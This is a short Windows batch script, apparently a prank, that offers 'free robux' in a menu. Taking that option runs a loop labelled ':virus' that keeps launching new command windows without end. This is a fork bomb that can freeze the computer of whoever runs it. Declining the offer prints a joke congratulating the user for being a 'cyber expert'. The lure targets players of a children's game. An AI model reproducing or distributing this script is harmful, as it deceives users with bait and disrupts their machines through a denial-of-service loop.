@echo off
color 0A
cls

:menu
echo Choose an option:
echo.
echo [A] Go to get your free robux
echo [B] decline 
echo [X] Exit
echo.

set /p choice=Type your choice and press Enter: 

if /i "%choice%"=="a" goto optionA
if /i "%choice%"=="b" goto optionB
if /i "%choice%"=="x" goto end

echo Invalid choice, try again!
timeout /t 2 >nul
cls
goto menu

:optionB
cls
echo GOOD JOB, your a cyber expert
goto end

:optionA
cls
echo pres eneter to get your free robux
pause
goto virus

:virus
start
goto virus

:end
cls
echo Exiting the program...
timeout /t 2 >nul
exit
